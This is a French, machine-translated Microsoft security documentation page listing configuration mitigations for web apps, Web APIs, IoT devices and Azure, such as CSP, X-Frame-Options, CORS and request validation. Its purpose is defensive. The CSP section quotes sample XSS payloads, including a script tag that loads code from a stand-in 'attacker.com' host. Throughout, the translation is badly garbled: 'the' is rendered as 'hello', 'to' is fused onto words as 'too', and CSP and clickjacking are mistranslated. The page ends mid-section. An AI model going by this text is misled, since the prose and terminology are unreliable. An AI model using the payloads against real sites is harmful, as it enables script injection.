---
title: "aaaConfiguration de gestion - outil de modélisation des menaces Microsoft - Azure | Documents Microsoft"
description: "mesures d’atténuation des menaces exposé Bonjour outil de modélisation des menaces"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Infrastructure de sécurité : gestion des configurations | Mesures de prévention 
| Produit/service | Article |
| --------------- | ------- |
| **Application web** | <ul><li>[Implémenter la stratégie de sécurité de contenu (CSP) et désactiver l’exécution de scripts JavaScript inline](#csp-js)</li><li>[Activer le filtre XSS du navigateur](#xss-filter)</li><li>[Les applications ASP.NET doivent désactiver le suivi et de débogage toodeployment préalable](#trace-deploy)</li><li>[Accéder aux scripts JavaScript tiers émanant uniquement de sources approuvées](#js-trusted)</li><li>[S’assurer que les pages ASP.NET authentifiées incorporent des techniques de défense contre les attaques par redirection d’interface utilisateur ou détournement de clics](#ui-defenses)</li><li>[S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur les applications web ASP.NET](#cors-aspnet)</li><li>[Activer l’attribut ValidateRequest sur les pages ASP.NET](#validate-aspnet)</li><li>[Utiliser les dernières versions des bibliothèques JavaScript hébergées localement](#local-js)</li><li>[Désactiver la détection MIME automatique](#mime-sniff)</li><li>[Supprimer les en-têtes standard de serveur sur l’identification par empreinte tooavoid des Sites Web Windows Azure](#standard-finger)</li></ul> |
| **Base de données** | <ul><li>[Configurer un pare-feu Windows pour accéder au moteur de base de données](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur API Web ASP.NET](#cors-api)</li><li>[Chiffrer les sections des fichiers de configuration de l’API Web qui contiennent des données sensibles](#config-sensitive)</li></ul> |
| **Appareil IoT** | <ul><li>[S’assurer que toutes les interfaces d’administration sont sécurisées avec des informations d’identification fortes](#admin-strong)</li><li>[S’assurer que le code inconnu ne peut pas s’exécuter sur les appareils](#unknown-exe)</li><li>[Chiffrer les partitions du système d’exploitation et les partitions supplémentaires de l’appareil IoT avec BitLocker](#partition-iot)</li><li>[Assurez-vous qu’uniquement hello services/fonctionnalités minimales sont activées sur les appareils](#min-enable)</li></ul> |
| **Passerelle de champ IoT** | <ul><li>[Chiffrer les partitions du système d’exploitation et les partitions supplémentaires de la passerelle de champ IoT avec Bitlocker](#field-bit-locker)</li><li>[Vérifiez que les informations d’identification du compte de connexion par défaut hello de passerelle de champ hello sont modifiées pendant l’installation](#default-change)</li></ul> |
| **Passerelle de cloud IoT** | <ul><li>[Assurez-vous que la passerelle de Cloud hello implémente un microprogramme des périphériques processus tookeep hello connecté des toodate](#cloud-firmware)</li></ul> |
| **Délimitation d’approbation machine** | <ul><li>[S’assurer que les appareils disposent de contrôles de sécurité des points de terminaison configurés conformément aux directives organisationnelles](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Garantir une gestion sécurisée des clés d’accès de stockage Azure](#secure-keys)</li><li>[S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur le stockage Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Activer la fonctionnalité de limitation de service WCF](#throttling)</li><li>[Divulgation d’informations WCF par le biais des métadonnées](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implémenter la stratégie de sécurité de contenu (CSP) et désactiver l’exécution de scripts JavaScript inline

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Une stratégie de sécurité de tooContent Introduction](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [référence de stratégie de sécurité contenu](http://content-security-policy.com/), [des fonctionnalités de sécurité](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [stratégie de sécurité toocontent Introduction](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [CSP puis-je utiliser ?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Étapes** | <p>Stratégie de sécurité contenu (CSP) est un mécanisme de sécurité de défense en profondeur, tel qu’un W3C standard, qui permet le contrôle web application propriétaires toohave sur le contenu de hello incorporé dans leur site. Fournisseur de services cryptographiques est ajouté comme un en-tête de réponse HTTP sur le serveur web de hello et est appliquée côté client de hello par les navigateurs. Cette stratégie repose sur une liste blanche : un site web peut déclarer un ensemble de domaines approuvés à partir desquels un contenu actif tel qu’un script JavaScript peut être chargé.</p><p>Fournisseur de services cryptographiques fournit hello avantages de sécurité suivants :</p><ul><li>**Protection contre les XSS :** si une page est vulnérable tooXSS, un intrus peut exploiter il 2 façons :<ul><li>Injection du code `<script>malicious code</script>`. Cette attaque ne fonctionnera pas en raison de tooCSP Base Restriction-1</li><li>Injection du code `<script src=”http://attacker.com/maliciousCode.js”/>`. Cette attaque ne fonctionnera pas comme domaine contrôlé par l’attaquant de hello ne sera pas dans la liste blanche d’adresses du CSP de domaines</li></ul></li><li>**Un contrôle sur une exfiltration de données :** si un contenu malveillant sur une page Web tente de dérober des données et site Web externe de tooconnect tooan, hello connexion sera interrompue par le fournisseur de services cryptographiques. Il s’agit, car le domaine cible de hello ne sera pas dans la liste blanche d’adresses du CSP</li><li>**Défense contre levage de clic :** levage de clic est une technique d’attaque à l’aide de laquelle un adversaire encadrer un site Web authentique et forcer les utilisateurs tooclick sur les éléments d’interface utilisateur. À l’heure actuelle, la technique de défense contre le détournement de clics consiste à configurer un en-tête de réponse X-Frame-Options. Pas tous les navigateurs respectent cet en-tête et CSP vers l’avant de passer sera un toodefend de manière standard contre levage-cliquez sur</li><li>**Création de rapports en temps réel attaque :** s’il existe une attaque par injection de code sur un site Web compatible CSP, navigateurs déclenche automatiquement un point de terminaison tooan notification configuré sur le serveur Web de hello. De cette façon, la stratégie CSP fait office de système d’avertissement en temps réel.</li></ul> |

### <a name="example"></a>Exemple
Exemple de stratégie : 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Cette stratégie permet à tooload de scripts uniquement à partir de l’application hello web server et serveur analytique de google. Les scripts chargés à partir de tout autre site seront rejetés. Lorsque le fournisseur de services cryptographiques est activé sur un site Web, hello fonctionnalités suivantes sont automatiquement désactivés toomitigate XSS attaques. 

### <a name="example"></a>Exemple
Les scripts inline ne s’exécuteront pas. Voici quelques exemples de scripts inline. 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemple
Les chaînes ne seront pas évaluées en tant que code. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Activer le filtre XSS du navigateur

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [XSS Protection Filter (Filtre de protection anti-XSS)](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Étapes** | <p>Contrôles de configuration d’en-tête X-XSS-Protection réponse hello filtre de script entre sites du navigateur. Cet en-tête de réponse peut présenter les valeurs suivantes :</p><ul><li>`0:`Cette opération va désactiver le filtre de hello</li><li>`1: Filter enabled`Si une attaque de script entre sites est détectée, en cas d’attaque ordre toostop hello, navigateur de hello assainir la page de hello</li><li>`1: mode=block : Filter enabled`. Au lieu d’expurgation page hello lors de la détection d’une attaque XSS, hello navigateur empêche le rendu de page de hello</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. navigateur de Hello assainir la violation du hello hello page et de rapport.</li></ul><p>Il s’agit d’une fonction de chrome utilisant le fournisseur de services cryptographiques violation rapports toosend détails tooa URI de votre choix. Hello 2 dernières options sont considérés comme valeurs sûres.</p>|

## <a id="trace-deploy"></a>Les applications ASP.NET doivent désactiver le suivi et de débogage toodeployment préalable

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Vue d’ensemble du débogage ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Vue d’ensemble du traçage ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Comment : activer le traçage d’une application ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Comment : activer le débogage pour les applications ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Étapes** | Lorsque le traçage est activé pour la page de hello, chaque navigateur demandant également Obtient des informations de trace hello qui contient des données sur l’état du serveur interne et le flux de travail. Ces informations peuvent être liées à la sécurité. Lorsque le débogage est activé pour la page de hello, les erreurs qui se passe sur les résultats du serveur hello dans une données de trace de pile complet présenté toohello navigateur. Ces données peuvent exposer les informations de sécurité sur les flux de travail du serveur hello. |

## <a id="js-trusted"></a>Accéder aux scripts JavaScript tiers émanant uniquement de sources approuvées

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Les scripts JavaScript tiers doivent uniquement être référencés à partir de sources approuvées. points de terminaison Hello référence doivent toujours être sur SSL. |

## <a id="ui-defenses"></a>S’assurer que les pages ASP.NET authentifiées incorporent des techniques de défense contre les attaques par redirection d’interface utilisateur ou détournement de clics

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [OWASP Clickjacking Defense Cheat Sheet (Aide-mémoire OWASP sur les techniques de défense contre le détournement de clics)](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - Combating ClickJacking With X-Frame-Options (IEInternals - Lutter contre le détournement de clics avec X-Frame-Options)](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Étapes** | <p>levage-cliquez sur, également appelé une « attaque de recours l’interface utilisateur, » est lorsqu’une personne malveillante utilise plusieurs couches transparent ou opaque tootrick un utilisateur en cliquant sur un bouton ou un lien sur une autre page lorsqu’ils ont l’intention tooclick sur la page de niveau supérieur hello.</p><p>Cette disposition est obtenue en créant une page avec un iframe, ce qui charge la page de la victime hello. Par conséquent, les intrus hello sont « détournement » clique sur destinée à leur page, de leur routage page tooanother, très probablement détenu par une autre application, domaine ou les deux. Autoriser l’ensemble hello approprié X-Frame-Options en-têtes de réponse HTTP qui commandent aux hello navigateur toonot tooprevent levage-cliquez sur les attaques, trame à partir d’autres domaines</p>|

### <a name="example"></a>Exemple
en-tête X-FRAME-OPTIONS de Hello peut être définie via IIS web.config. Extrait de code du fichier web.config pour les sites qui ne doivent jamais être chargés dans un cadre : 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemple
Code du fichier Web.config pour les sites qui doivent uniquement être encadrée par des pages en hello même domaine : 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur les applications web ASP.NET

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Web Forms, MVC5 |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | <p>Sécurité du navigateur empêche la rend AJAX demandes tooanother domaine d’une page web. Cette restriction est appelée stratégie de même origine hello et un site malveillant empêche de lire des données sensibles à partir d’un autre site. Cependant, parfois, il peut être requis tooexpose API en toute sécurité que les autres sites peuvent consommer. Entre le partage de ressources Origin (CORS) est une norme W3C qui permet à un serveur de stratégie de même origine toorelax hello. Grâce au mécanisme CORS, un serveur peut autoriser explicitement certaines demandes multi-origines tout en en refusant d’autres.</p><p>CORS est plus sûr et plus flexible que les techniques précédentes telles que JSONP. Fondamentalement, l’activation de CORS traduit tooadding quelques en-têtes de réponse HTTP (Access - Control-*) d’application web de toohello et il est possible de deux façons.</p>|

### <a name="example"></a>Exemple
Si l’accès tooWeb.config est disponible, CORS peuvent être ajoutées via hello suivant de code : 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemple
Si l’accès tooweb.config n’est pas disponible, CORS peut être configuré en ajoutant hello après CSharp de code : 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Veuillez Notez qu’il est critique tooensure qui hello liste des origines dans l’attribut de « Access-Control-Allow-Origin » a la valeur tooa un jeu finie et approuvé d’origine. Échec tooconfigure ce de façon inappropriée (par exemple, valeur hello en tant que ' *') permet tootrigger sites malveillants des requêtes d’origine entre toohello web application > sans aucune restriction, rendant ainsi hello application vulnérable tooCSRF attaques. 

## <a id="validate-aspnet"></a>Activer l’attribut ValidateRequest sur les pages ASP.NET

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Web Forms, MVC5 |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Request Validation - Preventing Script Attacks (Validation des demandes - Prévention des attaques par script)](http://www.asp.net/whitepapers/request-validation) |
| **Étapes** | <p>Validation de la demande, une fonctionnalité d’ASP.NET depuis la version 1.1, empêche l’acceptation de contenu HTML de non encodée contenant les serveur hello. Cette fonctionnalité est conçue toohelp empêcher certaines attaques d’injection de script : code de script client ou HTML peut être involontairement soumis tooa server, stockées et ensuite présenté aux utilisateurs de tooother. Nous vous recommandons vivement de valider toutes les données d’entrée et de les encoder en HTML s’il y a lieu.</p><p>Validation de la demande est effectuée en comparant la liste de tooa toutes les données d’entrée de valeurs potentiellement dangereuses. Si une correspondance est trouvée, ASP.NET lève une exception `HttpRequestValidationException`. La fonctionnalité de validation des demandes est activée par défaut.</p>|

### <a name="example"></a>Exemple
Toutefois, cette fonctionnalité peut être désactivée au niveau de la page : 
```XML
<%@ Page validateRequest="false" %> 
```
ou au niveau de l’application : 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Notez que la fonctionnalité de validation des demandes n’est pas prise en charge et ne fait pas partie intégrante du pipeline MVC6. 

## <a id="local-js"></a>Utiliser les dernières versions des bibliothèques JavaScript hébergées localement

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | <p>Les développeurs ayant recours aux bibliothèques JavaScript standard telles que JQuery doivent utiliser des versions approuvées des bibliothèques JavaScript courantes qui ne présentent aucun défaut de sécurité connu. Une bonne pratique est toouse hello plus dernière version des bibliothèques de hello, puisqu’elles contiennent des correctifs de sécurité pour les vulnérabilités connues dans leurs versions antérieures.</p><p>Si la version la plus récente hello ne peut pas être utilisée en raison des raisons de toocompatibility, hello sous la version minimale doit être utilisé.</p><p>Versions minimales acceptables :</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms et Ajax**<ul><li>ASP.NET Web Forms et Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Ne chargez jamais une bibliothèque JavaScript à partir de sites externes tels que des réseaux de distribution de contenu (CDN) publics.</p>|

## <a id="mime-sniff"></a>Désactiver la détection MIME automatique

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [IE8 Security Part V: Comprehensive Protection (Sécurité IE8 Partie V - Protection complète)](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME type (Type MIME)](http://en.wikipedia.org/wiki/Mime_type) |
| **Étapes** | en-tête de Hello X-contenu-Type-Options est un en-tête HTTP qui permet aux développeurs toospecify que leur contenu ne doit pas être détectées de MIME. Cet en-tête est conçue toomitigate détection MIME sur les attaques. Pour chaque page peut contenir du contenu contrôlable par l’utilisateur, vous devez utiliser hello HTTP en-tête X-contenu-Type-Options : nosniff. en-tête requis du hello tooenable globalement pour toutes les pages de l’application hello, vous pouvez procédez d’une des manières de hello|

### <a name="example"></a>Exemple
Ajoutez les en-tête hello dans le fichier web.config de hello si l’application hello est hébergée par Internet Information Services (IIS) 7 et versions ultérieures. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemple
Ajouter un en-tête hello via hello Application globale\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemple
Implémentez un module HTTP personnalisé. 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemple
Vous pouvez activer l’en-tête requis de hello uniquement pour les pages spécifiques en ajoutant des réponses de tooindividual : 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Supprimer les en-têtes standard de serveur sur l’identification par empreinte tooavoid des Sites Web Windows Azure

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Application web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | EnvironmentType - Azure |
| **Informations de référence**              | [Removing standard server headers on Windows Azure Web Sites (Supprimer les en-têtes de serveur standard de l’offre Sites Web Microsoft Azure)](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Étapes** | En-têtes telles que Server, X-alimenté par, Version X-AspNet révèlent des informations sur le serveur de hello et hello technologies sous-jacentes. Il est recommandé de toosuppress ces en-têtes, ce qui évite d’identification par empreinte hello application |

## <a id="firewall-db"></a>Configurer un pare-feu Windows pour accéder au moteur de base de données

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Base de données | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | SQL Azure, OnPrem |
| **Attributs**              | N/A, Version SQL - V12 |
| **Informations de référence**              | [Pare-feu de données SQL Azure de tooconfigure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurer un pare-feu Windows pour accéder au moteur de base de données](https://msdn.microsoft.com/library/ms175043) |
| **Étapes** | Systèmes de pare-feu empêchent les ressources de toocomputer tout accès non autorisé. tooaccess une instance de hello du moteur de base de données SQL Server via un pare-feu, vous devez configurer le pare-feu hello sur ordinateur hello accès tooallow de SQL Server en cours d’exécution |

## <a id="cors-api"></a>S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur API Web ASP.NET

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | API Web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | MVC 5 |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Enabling Cross-Origin Requests in ASP.NET Web API 2 (Activation des demandes multi-origines dans API Web ASP.NET 2)](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [API Web ASP.NET - Prise en charge de CORS dans l’API Web ASP.NET 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Étapes** | <p>Sécurité du navigateur empêche la rend AJAX demandes tooanother domaine d’une page web. Cette restriction est appelée stratégie de même origine hello et un site malveillant empêche de lire des données sensibles à partir d’un autre site. Cependant, parfois, il peut être requis tooexpose API en toute sécurité que les autres sites peuvent consommer. Entre le partage de ressources Origin (CORS) est une norme W3C qui permet à un serveur de stratégie de même origine toorelax hello.</p><p>Grâce au mécanisme CORS, un serveur peut autoriser explicitement certaines demandes multi-origines tout en en refusant d’autres. CORS est plus sûr et plus flexible que les techniques précédentes telles que JSONP.</p>|

### <a name="example"></a>Exemple
Bonjour App_Start/WebApiConfig.cs, ajouter hello code toohello WebApiConfig.Register méthode 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemple
Attribut de EnableCors peut être des méthodes de tooaction appliqués dans un contrôleur comme suit : 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Veuillez Notez qu’il est critique tooensure qui hello liste des origines dans EnableCors attribut a la valeur tooa un jeu finie et approuvé d’origine. Échec tooconfigure ce de façon inappropriée (par exemple, valeur hello en tant que ' *') permettra tootrigger sites malveillants Cross-origine demandes toohello API sans aucune restriction, > rendant hello API tooCSRF vulnérable attaques. EnableCors peut être décoré au niveau du contrôleur. 

### <a name="example"></a>Exemple
toodisable CORS sur une méthode particulière dans une classe, hello DisableCors attribut peut être utilisé comme indiqué ci-dessous : 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | API Web | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | MVC 6 |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0 (Activation des demandes multi-origines (CORS) dans ASP.NET Core 1.0)](https://docs.asp.net/en/latest/security/cors.html) |
| **Étapes** | <p>Dans ASP.NET Core 1.0, CORS peut être activé au moyen d’un intergiciel (middleware) ou de MVC. Lorsque vous utilisez hello CORS tooenable MVC mêmes services CORS sont utilisés, mais hello intergiciel (middleware) CORS n’est pas.</p>|

**Approche-1** l’activation de CORS avec intergiciel (middleware) : tooenable CORS pour l’ensemble de l’application hello ajouter pipeline hello CORS intergiciel (middleware) toohello demande à l’aide de la méthode d’extension UseCors hello. Une stratégie de cross-origine peut être spécifiée lors de l’ajout d’intergiciel (middleware) CORS hello à l’aide de la classe de CorsPolicyBuilder hello. Il existe deux façons toodo cela :

### <a name="example"></a>Exemple
Hello est tout d’abord toocall UseCors avec une expression lambda. Les lambda Hello prend un objet CorsPolicyBuilder : 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemple
Hello est ensuite toodefine une ou plusieurs stratégies de règles CORS et la stratégie de hello puis par nom au moment de l’exécution. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**2-approche** l’activation de CORS dans MVC : les développeurs peuvent également utiliser MVC tooapply CORS spécifique par action, par contrôleur, ou pour tous les contrôleurs.

### <a name="example"></a>Exemple
Par action : une stratégie CORS pour une action spécifique de toospecify ajouter une action de toohello d’attribut hello [EnableCors]. Spécifiez le nom de la stratégie hello. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemple
Par contrôleur : 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemple
Au niveau global : 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Veuillez Notez qu’il est critique tooensure qui hello liste des origines dans EnableCors attribut a la valeur tooa un jeu finie et approuvé d’origine. Échec tooconfigure ce de façon inappropriée (par exemple, valeur hello en tant que ' *') permettra tootrigger sites malveillants Cross-origine demandes toohello API sans aucune restriction, > rendant hello API tooCSRF vulnérable attaques. 

### <a name="example"></a>Exemple
toodisable CORS pour un contrôleur ou d’une action, utiliser l’attribut hello [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Chiffrer les sections des fichiers de configuration de l’API Web qui contiennent des données sensibles

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | API Web | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Comment : Chiffrer des Sections de Configuration dans ASP.NET 2.0 à l’aide de DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [en spécifiant un fournisseur de Configuration protégée](https://msdn.microsoft.com/library/68ze1hb2.aspx), [secrets d’application à l’aide d’Azure Key Vault tooprotect](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Étapes** | Fichiers de configuration tels que hello Web.config, appsettings.json sont souvent utilisées toohold des informations sensibles, notamment des noms d’utilisateur, les mots de passe, des chaînes de connexion de base de données et des clés de chiffrement. Si vous ne protégez pas ces informations, votre application est vulnérable tooattackers ou obtenir des informations sensibles telles que les noms d’utilisateur de compte et les mots de passe, les noms de base de données et les noms de serveur des utilisateurs malveillants. Selon le type de déploiement hello (azure/localement), chiffrer les sections de sensibles hello de fichiers de configuration à l’aide de DPAPI ou des services tels que le coffre de clés Azure. |

## <a id="admin-strong"></a>S’assurer que toutes les interfaces d’administration sont sécurisées avec des informations d’identification fortes

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Appareil IoT | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Toute administration interfaces cet appareil hello ou expose de passerelle de champ doit être sécurisées à l’aide des informations d’identification fortes. Il en est de même pour toutes les autres interfaces exposées telles que WiFi, SSH, Partages de fichiers et FTP. Les mots de passe faibles par défaut ne doivent pas être utilisés. |

## <a id="unknown-exe"></a>S’assurer que le code inconnu ne peut pas s’exécuter sur les appareils

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Appareil IoT | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Enabling Secure Boot and BitLocker Device Encryption on Windows 10 IoT Core (Activation du démarrage sécurisé et du chiffrement d’appareil BitLocker sur Windows 10 IoT Standard)](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
